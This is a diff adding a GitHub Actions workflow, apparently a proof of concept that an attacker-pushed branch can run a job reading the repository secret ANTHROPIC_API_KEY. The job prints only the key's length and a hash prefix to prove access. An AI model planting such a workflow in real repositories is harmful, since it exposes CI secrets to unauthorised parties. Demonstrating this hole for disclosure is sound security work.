@@ -1,0 +1,16 @@
+name: poc-escalation
+on:
+  push:
+    branches: [poc-escalation]
+permissions:
+  contents: read
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    steps:
+      - name: proof
+        env:
+          S: ${{ secrets.ANTHROPIC_API_KEY }}
+        run: |
+          echo "PoC v3: attacker-pushed workflow executed on push"
+          echo "repo secret ANTHROPIC_API_KEY readable: length=${#S} sha256prefix=$(printf %s "$S" | sha256sum | cut -c1-12)"
